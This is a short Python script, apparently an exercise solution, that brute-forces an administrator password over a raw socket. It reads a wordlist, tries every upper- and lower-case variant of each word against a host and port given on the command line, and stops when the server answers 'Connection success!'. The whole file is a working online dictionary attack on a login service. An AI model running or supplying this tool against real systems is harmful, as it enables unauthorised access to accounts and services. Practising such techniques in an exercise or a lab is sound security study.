import sys
import socket
from itertools import product


with open('passwords.txt', 'r') as file:
    passwords = file.readlines()


def generate_passwords(password):
    chars = [char + char.upper() for char in list(password.strip())]
    return product(*chars)


address = (sys.argv[1], int(sys.argv[2]))


with socket.socket() as client:
    client.connect(address)
    admin_password = ""
    for password in passwords:
        set = generate_passwords(password)
        for word in set:
            client.send(''.join(word).encode())
            response = client.recv(1024)
            res = response.decode()
            if res == 'Connection success!':
                admin_password = ''.join(word)
                break
        if admin_password:
            break
    print(admin_password)
